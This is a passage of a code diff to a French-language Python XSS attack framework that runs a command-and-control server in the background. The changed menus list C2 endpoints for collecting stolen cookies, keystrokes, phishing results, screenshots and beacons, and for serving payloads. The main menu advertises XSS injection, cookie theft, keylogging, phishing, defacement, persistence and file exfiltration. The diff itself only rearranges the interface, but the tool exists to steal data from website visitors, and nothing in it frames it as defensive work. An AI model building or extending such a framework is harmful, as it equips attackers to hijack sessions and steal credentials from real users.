+    type_filter = type_map.get(choice)
 
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
@@ -1498,42 +1477,15 @@ def menu_captures():
     press_enter()
 
 
-def menu_report():
-    CONSOLE.print("\n[bold cyan]═══ RAPPORT ═══[/bold cyan]\n")
-    path = generate_html_report()
-    CONSOLE.print(f"[bold green]✓ Rapport généré : {path}[/bold green]")
-    press_enter()
-
-
 def menu_c2():
     CONSOLE.print("\n[bold cyan]═══ SERVEUR C2 ═══[/bold cyan]\n")
-    CONSOLE.print(f"  Adresse publique : [cyan]{C2_PUBLIC}[/cyan]")
-    CONSOLE.print(f"  Écoute sur : [cyan]{C2_HOST}:{C2_PORT}[/cyan]")
-    CONSOLE.print(f"  Endpoints disponibles :")
+    CONSOLE.print(f"  IP locale détectée : [cyan]{get_local_ip()}[/cyan]")
+    CONSOLE.print(f"  URL publique C2    : [cyan]{C2_PUBLIC}[/cyan]")
+    CONSOLE.print(f"  Écoute sur         : [cyan]{C2_HOST}:{C2_PORT}[/cyan]")
+    CONSOLE.print(f"  Endpoints :")
     for ep in ["/collect/cookies", "/collect/keys", "/collect/phish", "/collect/beacon",
                "/collect/screen", "/payload/<id>", "/download/<file>"]:
         CONSOLE.print(f"    [dim]{ep}[/dim]")
-    press_enter()
-
-
-def menu_settings():
-    global C2_PORT, C2_PUBLIC
-    CONSOLE.print("\n[bold cyan]═══ PARAMÈTRES ═══[/bold cyan]\n")
-    CONSOLE.print(f"  C2 Host : [cyan]{C2_HOST}[/cyan]")
-    CONSOLE.print(f"  C2 Port : [cyan]{C2_PORT}[/cyan]")
-    CONSOLE.print(f"  C2 Public URL : [cyan]{C2_PUBLIC}[/cyan]")
-    CONSOLE.print(f"  Base de données : [cyan]{DB_FILE}[/cyan]\n")
-
-    new_port = Prompt.ask("[cyan]Nouveau port C2 (vide pour garder)[/cyan]", default="")
-    if new_port:
-        C2_PORT = int(new_port)
-        CONSOLE.print(f"[yellow]Port changé — redémarre le serveur C2 pour appliquer.[/yellow]")
-
-    new_public = Prompt.ask("[cyan]Nouvelle URL publique C2 (vide pour garder)[/cyan]", default="")
-    if new_public:
-        C2_PUBLIC = new_public
-        CONSOLE.print(f"[green]URL publique mise à jour : {C2_PUBLIC}[/green]")
-
     press_enter()
 
 
@@ -1541,30 +1493,32 @@ def main():
     db_init()
     print_banner()
 
+    CONSOLE.print(f"[bold green]IP locale auto-détectée : {get_local_ip()}[/bold green]")
+    CONSOLE.print(f"[bold green]C2 public configuré sur : {C2_PUBLIC}[/bold green]\n")
+
     # Lance le serveur C2 en arrière-plan
     c2_thread = threading.Thread(target=run_c2_server, daemon=True)
     c2_thread.start()
-    CONSOLE.print(f"[bold green]✓ Serveur C2 démarré sur {C2_PUBLIC}[/bold green]\n")
+    CONSOLE.print(f"[bold green]Serveur C2 démarré sur {C2_PUBLIC}[/bold green]\n")
     time.sleep(0.5)
 
     while True:
         CONSOLE.print("\n[bold cyan]═══════════ MENU PRINCIPAL ═══════════[/bold cyan]\n")
-        CONSOLE.print("  [1] 🔍 Scanner XSS (réfléchi + stocké)")
-        CONSOLE.print("  [2] 💥 Exploitation (cookies, phishing, keylogger, deface...)")
-        CONSOLE.print("  [3] 💾 XSS Stocké (injection via formulaires)")
-        CONSOLE.print("  [4] 🔄 Persistance (activation/désactivation/liste)")
-        CONSOLE.print("  [5] 📊 Données Capturées (cookies, identifiants, clavier...)")
-        CONSOLE.print("  [6] 📁 Fichiers (upload, download, exfil)")
-        CONSOLE.print("  [7] 🖥️  Serveur C2 (infos)")
-        CONSOLE.print("  [8] 📄 Générer Rapport HTML")
-        CONSOLE.print("  [9] ⚙️  Paramètres")
-        CONSOLE.print("  [0] 🚪 Quitter\n")
+        CONSOLE.print("  [1] Scanner XSS (réfléchi + stocké)")
+        CONSOLE.print("  [2] Exploitation (cookies, phishing, keylogger, deface...)")
+        CONSOLE.print("  [3] XSS Stocké (injection via formulaires)")
+        CONSOLE.print("  [4] Persistance (activation/désactivation/liste)")
+        CONSOLE.print("  [5] Données Capturées (cookies, identifiants, clavier...)")
+        CONSOLE.print("  [6] Fichiers (upload, download, exfil)")
+        CONSOLE.print("  [7] Serveur C2 (infos)")
+        CONSOLE.print("  [8] Générer Rapport HTML")
+        CONSOLE.print("  [0] Quitter\n")
 
         choice = Prompt.ask("[bold yellow]Choix[/bold yellow]", default="1")
 
         if choice == "0":
             persistence_mgr.stop()
-            CONSOLE.print("[bold red]Arrêt du framework. Au revoir ![/bold red]")
+            CONSOLE.print("[bold red]Arrêt du framework. Au revoir — Jathniel.[/bold red]")
             sys.exit(0)
         elif choice == "1":
             menu_scan()
@@ -1581,9 +1535,9 @@ def main():
         elif choice == "7":
             menu_c2()
         elif choice == "8":
-            menu_report()
-        elif choice == "9":
-            menu_settings()
+            path = generate_html_report()
+            CONSOLE.print(f"[bold green]Rapport généré : {path}[/bold green]")
+            press_enter()
         else:
             CONSOLE.print("[red]Option invalide.[/red]")
 
